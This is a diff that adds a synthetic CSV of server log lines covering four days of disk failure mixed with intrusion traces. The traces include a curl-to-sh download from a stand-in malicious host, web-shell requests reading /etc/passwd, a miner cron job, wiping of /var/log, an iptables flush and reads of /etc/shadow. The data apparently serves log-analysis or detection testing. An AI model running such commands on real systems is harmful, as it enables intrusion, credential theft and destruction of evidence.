@@ -1,0 +1,98 @@
+timestamp,log_message
+2024-12-21 00:01:05,kernel: [341256.01] EXT4-fs (sda1): delayed block allocation failed for inode 12; out of space
+2024-12-21 00:05:12,sshd: Accepted password for root from 192.168.1.250 port 44321 ssh2
+2024-12-21 00:05:15,pam_unix(sshd:session): session opened for user root by (uid=0)
+2024-12-21 00:10:22,sshd: Received disconnect from 192.168.1.250 port 44321:11: disconnected by user
+2024-12-21 01:22:45,auditd: Audit log velocity exceeds storage IOPS; messages dropped
+2024-12-21 02:40:00,sudo: unknown_user : PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://malicious-site.com/shell.sh | sh
+2024-12-21 03:15:10,kernel: [351234.88] traps: pwn-exploit[4512] general protection fault ip:7f21 sp:7f22 error:0
+2024-12-21 04:55:01,df: CRITICAL: / (Root) is at 100% capacity; 0 bytes available
+2024-12-21 05:12:30,sshd: Failed password for root from 94.156.71.22 port 59123 ssh2
+2024-12-21 05:12:32,sshd: Failed password for root from 94.156.71.22 port 59123 ssh2
+2024-12-21 05:12:34,sshd: Failed password for root from 94.156.71.22 port 59123 ssh2
+2024-12-21 06:30:15,systemd: Failed to write to /var/lib/systemd/random-seed: No space left on device
+2024-12-21 07:12:01,sudo: user2 : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/tcpdump -w /tmp/capture.pcap
+2024-12-21 08:45:00,nginx: [alert] 1245#0: *8901 header list in-memory allocation failed while reading upper headers
+2024-12-21 09:20:44,kernel: [381234.12] Out of memory: kill process 891 (rsyslogd) score 10
+2024-12-21 10:05:12,sshd: Accepted publickey for attacker_key from 203.0.113.11 port 33211 ssh2
+2024-12-21 10:05:13,pam_unix(sshd:session): session opened for user root by (uid=0)
+2024-12-21 10:15:30,sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/rm -rf /var/log/*
+2024-12-21 11:22:10,smartd: Device: /dev/sda, SMART Self-Test FAILED (Status: Read failure)
+2024-12-21 12:40:01,logrotate: error: skip rotating /var/log/nginx/access.log (no space on /var)
+2024-12-21 13:10:22,kernel: [412345.55] Buffer I/O error on dev sda1, logical block 0, lost async page write
+2024-12-21 14:00:05,systemd-journald: Failed to rotate /var/log/journal/system.journal: No space left on device
+2024-12-21 15:22:10,sshd: Invalid user admin1 from 185.220.101.4 port 44123
+2024-12-21 15:22:12,sshd: Invalid user admin2 from 185.220.101.4 port 44123
+2024-12-21 16:45:30,sudo: user1 : COMMAND=/usr/bin/apt-get install -y nmap
+2024-12-21 17:10:05,kernel: [441234.09] EXT4-fs (sda1): I/O error while writing superblock
+2024-12-21 17:10:06,kernel: [441234.10] EXT4-fs (sda1): Remounting filesystem read-only to prevent corruption
+2024-12-21 18:30:00,mysqld: [ERROR] Could not open log file: No space left on device
+2024-12-21 19:15:12,nginx: 45.155.205.10 - "GET /shell.php?cmd=whoami HTTP/1.1" 200
+2024-12-21 19:15:14,nginx: 45.155.205.10 - "GET /shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200
+2024-12-21 20:05:44,sshd: Failed password for root from 45.155.205.10 port 55122
+2024-12-21 21:50:00,auditd: Audit daemon is stopping due to write error (Disk Full)
+2024-12-21 22:10:12,kernel: [481234.44] sd 0:0:0:0: [sda] UNKNOWN(0x2003) Result: hostbyte=0x00 driverbyte=0x08
+2024-12-22 00:01:05,systemd: Starting Rotation of log files (FAILED)
+2024-12-22 01:10:45,sshd: Accepted password for root from 5.188.10.4 port 38210 ssh2
+2024-12-22 01:12:00,pam_unix(sshd:session): session opened for user root by (uid=0)
+2024-12-22 02:40:01,cron: (root) CMD ( /usr/local/bin/miner.sh )
+2024-12-22 03:15:22,nginx: 192.168.1.10 - "GET /admin/db_export.zip HTTP/1.1" 200
+2024-12-22 04:55:10,kernel: [512345.01] READ FPDMA QUEUED: status { DRDY ERR }, error { UNC }
+2024-12-22 06:12:30,sshd: Connection closed by 5.188.10.4 [preauth]
+2024-12-22 07:45:00,systemd: Failed to start Daily Cleanup of Temporary Directories (No space left)
+2024-12-22 08:30:15,sudo: user3 : COMMAND=/usr/bin/crontab -e
+2024-12-22 09:10:22,kernel: [541234.55] Buffer I/O error on dev sda1, logical block 991283
+2024-12-22 10:45:33,sshd: Failed password for root from 103.25.10.5 port 55122
+2024-12-22 11:22:10,df: Filesystem /home is at 100% capacity; user write restricted
+2024-12-22 12:05:00,nginx: 10.0.0.99 - "GET /api/v1/auth/tokens HTTP/1.1" 200
+2024-12-22 13:40:12,sshd: Failed password for invalid user deploy from 212.10.44.1
+2024-12-22 14:15:05,kernel: [571234.09] UNC error at LBA 9988271
+2024-12-22 15:30:00,smartd: Device: /dev/sda, SMART Failure: Uncorrected Errors 152
+2024-12-22 16:55:10,sshd: Failed password for root from 45.33.21.10 port 33412
+2024-12-22 17:12:01,sudo: user1 : COMMAND=/usr/bin/nc -v 192.168.1.5 445
+2024-12-22 18:40:44,rsyslogd: Fatal error during file output write (Code: 28)
+2024-12-22 19:20:00,kernel: [601234.11] ata1.00: failed command: WRITE FPDMA QUEUED
+2024-12-22 20:45:12,sshd: Accepted publickey for backup_agent from 10.0.5.100 port 44102 ssh2
+2024-12-22 21:30:15,nginx: 198.51.100.45 - "GET /phpinfo.php HTTP/1.1" 200
+2024-12-22 22:55:01,auditd: Audit storage exhausted; system in fail-closed state
+2024-12-23 01:10:45,kernel: [641234.33] FATAL: Hardware failure on sda; I/O impossible
+2024-12-23 02:40:01,systemd: Failed to start Journal Service (Disk full / Read-only)
+2024-12-23 03:15:22,sshd: Failed password for root from 185.12.33.9
+2024-12-23 04:55:10,nginx: 5.188.10.4 - "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write HTTP/1.1" 200
+2024-12-23 06:12:30,sshd: Failed password for root from 5.188.10.4
+2024-12-23 07:45:00,kernel: [681234.00] Critical Media Failure on sda sector 1223
+2024-12-23 08:30:15,sudo: root : COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+2024-12-23 09:10:22,df: CRITICAL: /var is at 100% capacity
+2024-12-23 10:45:33,sshd: Failed password for root from 185.12.33.9
+2024-12-23 11:22:10,smartd: Device: /dev/sda, 48 offline uncorrectable sectors
+2024-12-23 12:05:00,nginx: 10.0.0.55 - "GET /admin/config.php HTTP/1.1" 200
+2024-12-23 13:40:12,sshd: Accepted password for admin from 192.168.1.10 port 41022 ssh2
+2024-12-23 14:15:05,kernel: [712345.55] ata1: hardware error code 0x4
+2024-12-23 15:30:00,mysqld: [ERROR] InnoDB: Out of disk space for the temporary file
+2024-12-23 16:55:10,sshd: Failed password for root from 80.80.80.80
+2024-12-23 17:12:01,sudo: user2 : COMMAND=/usr/bin/cat /etc/shadow
+2024-12-23 18:40:44,kernel: [741234.01] EXT4-fs (sda1): corruption detected; file system check required
+2024-12-23 19:20:00,sshd: User admin from 192.168.1.10 logged out
+2024-12-23 20:45:12,fail2ban: [sshd] Ban 80.80.80.80
+2024-12-23 21:30:15,nginx: 193.10.11.2 - "GET /v1/status?debug=true HTTP/1.1" 200
+2024-12-23 22:55:01,df: CRITICAL: /tmp is at 100% capacity
+2024-12-24 01:10:45,kernel: [781234.11] sd 0:0:0:0: [sda] Power-on or device reset occurred
+2024-12-24 02:40:01,systemd: Cannot start login.target (Disk Full)
+2024-12-24 03:15:22,sshd: Accepted password for root from 41.10.5.2 port 51022 ssh2
+2024-12-24 04:55:10,nginx: 41.10.5.2 - "POST /admin/upload.php HTTP/1.1" 200
+2024-12-24 06:12:30,sshd: root@pts/0 logged in from 41.10.5.2
+2024-12-24 07:45:00,kernel: [812345.99] ata1: fatal SError: { DevExch }
+2024-12-24 08:30:15,sudo: root : COMMAND=/usr/bin/iptables -F
+2024-12-24 09:10:22,df: CRITICAL: /var/log is at 100% capacity
+2024-12-24 10:45:33,sshd: Failed password for root from 185.12.33.9
+2024-12-24 11:22:10,smartd: Device: /dev/sda, Critical Warning: Reliable status NO
+2024-12-24 12:05:00,nginx: 10.0.0.55 - "GET /backup.db.sql HTTP/1.1" 200
+2024-12-24 13:40:12,sshd: Failed password for root from 190.10.10.10
+2024-12-24 14:15:05,kernel: [841234.22] EXT4-fs (sda1): unrecoverable error; system halting
+2024-12-24 15:30:00,mysqld: [ERROR] Out of disk space. Cannot write to temporary directory /tmp
+2024-12-24 16:55:10,sshd: Failed password for root from 190.10.10.10
+2024-12-24 17:12:01,sudo: user3 : COMMAND=/usr/bin/whois malicious-attacker.com
+2024-12-24 18:40:44,kernel: [871234.00] end_request: I/O error, dev sda, sector 122345
+2024-12-24 19:20:00,sshd: ALERT: Multiple root login attempts from 190.10.10.10
+2024-12-24 20:45:12,fail2ban: [sshd] Ban 190.10.10.10
+2024-12-24 21:00:00,kernel: [891234.55] System Halted.
